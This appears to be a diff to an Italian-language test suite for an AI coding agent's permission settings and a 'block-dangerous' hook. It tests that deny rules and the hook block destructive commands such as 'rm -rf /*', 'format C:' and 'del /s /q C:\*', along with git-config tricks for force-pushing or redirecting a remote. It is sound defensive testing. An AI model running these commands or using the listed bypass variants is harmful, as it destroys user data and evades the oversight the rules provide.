@@ -235,7 +235,11 @@ def test_k11(repo: Path) -> None:
         assert voce not in p["allow"], f"K11 {voce} salta ancora il classificatore della modalità auto"
     for voce in ("Bash(git status:*)", "Bash(cat:*)", "Bash(grep:*)"):
         assert voce in p["allow"], f"K11 manca il comando di sola lettura {voce}"
-    assert "Bash(format C:\\*)" in p["deny"], "K11 mancano i divieti per Windows"
+    # I deny `Bash(format C:\\*)` & co. erano confronti esatti e non scattavano mai (1/11/2026, F35):
+    # il disco intero lo blocca block-dangerous, e K15 lo prova lanciando la guardia.
+    for voce in p["deny"]:
+        assert not (voce.startswith("Bash(") and "\\*" in voce and "*" not in voce.replace("\\*", "")), \
+            f"K11 {voce} è un confronto esatto: non scatta sul comando che sembra coprire"
     am = d.get("autoMode") or {}
     assert any("scratchpad" in x for x in am.get("allow", [])), "K11 nessuna istruzione al classificatore sullo scratchpad"
     # Segnalazione n. 9 (20/10/2026, #3779): dopo il sì della persona lo sblocco del CLAUDE.md passa, gli altri no.
@@ -319,6 +323,10 @@ def _copre(regola: str, testo: str) -> bool:
     if strumento == "Bash":
         if corpo.endswith(":*"):
             return testo == corpo[:-2] or testo.startswith(corpo[:-2] + " ")
+        # Senza un `*` libero la regola è un confronto esatto col testo crudo, `\\*` compreso (1/11/2026,
+        # F33): `Bash(rm -rf /\\*)` non copre `rm -rf /*`.
+        if "*" not in corpo.replace("\\*", ""):
+            return testo == corpo
         parti = re.split(r"(\\\*|\*)", corpo)
         rx = "".join(r"\*" if p == "\\*" else ".*" if p == "*" else re.escape(p) for p in parti)
         return re.fullmatch(rx, testo, re.DOTALL) is not None
@@ -352,12 +360,26 @@ def test_k15(repo: Path) -> None:
                "git -c x=y push --force origin main", "git -c x=y push -f", "git -c x=y push origin +main",
                "git -c remote.origin.mirror=true push", "git -c remote.origin.push=+refs/heads/*:refs/heads/* push",
                "git -c alias.p='push --force' p", "git -c core.sshCommand=x push", "git -c core.sshcommand=x push",
-               "rm -rf /*", "rm -rf ~/*", "rm -rf /", "rm -rf ~", "rm -rf ~/", "rm -rf $HOME", "rm -rf $HOME/",
+               "git -c remote.origin.url=https://x.example/y.git push origin main",
+               "git -c url.https://x.example/.pushInsteadOf=https://github.com/ push",
+               "git --config-env=remote.origin.url=U push origin main",
+               "rm -rf /", "rm -rf ~", "rm -rf ~/", "rm -rf $HOME", "rm -rf $HOME/",
                "rm -rf / --no-preserve-root",
                "find . -exec rm {} +", "find . -execdir rm -rf {} +", "find . -exec /bin/rm {} +", "find . -ok rm {} \\;",
                "find . -exec sh -c 'rm -rf \"$1\"' _ {} \\;")
     for testo in vietati:
         assert coperto(bash, testo), f"K15 il deny non copre più {testo}"
+    # Il matcher vero: una regola senza `*` libero è un confronto esatto (veleno del 1/11/2026).
+    assert not _copre("Bash(rm -rf /\\*)", "rm -rf /*"), "K15 _copre legge `\\*` come un jolly"
+    # La radice, la home e il disco intero li blocca la guardia (exit 2), non un deny.
+    import subprocess
+    import sys as _sys
+    for testo in ("rm -rf /*", "rm -rf ~/*", "rm -r -f /*", "rm --recursive --force ~/*", "del /s /q C:\\*",
+                  "cmd //c rd /s /q C:\\", "format C:"):
+        dati = json.dumps({"tool_name": "Bash", "tool_input": {"command": testo}, "cwd": str(repo)})
+        r = subprocess.run([_sys.executable, "-B", str(repo / "hooks" / "block-dangerous.py")], input=dati,
+                           text=True, encoding="utf-8", capture_output=True, timeout=30, check=False)
+        assert r.returncode == 2, f"K15 block-dangerous non blocca {testo} (rc={r.returncode})"
 
 
 def test_k16(repo: Path) -> None:
